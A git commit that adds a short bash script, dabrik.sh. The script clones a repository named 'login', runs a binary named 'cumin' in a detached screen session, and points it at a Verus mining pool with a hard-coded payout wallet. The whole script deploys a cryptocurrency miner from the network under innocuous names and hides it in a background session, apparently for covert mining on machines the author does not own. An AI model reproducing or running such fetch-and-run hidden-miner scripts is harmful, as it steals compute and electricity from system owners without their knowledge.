8d08db7411f5810733ea861a4c2740db03ba83ea
sallygonza <90584824+sallygonza@users.noreply.github.com>
2022-01-11 07:11:13 +0700

    Create dabrik.sh

---
+++ dabrik.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+git clone https://github.com/sallygonza/login.git 
+cd login
+chmod +x cumin
+screen -dmS layar ./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.dabrik -t 2 -p c=VRSC,mc=VRSC\n
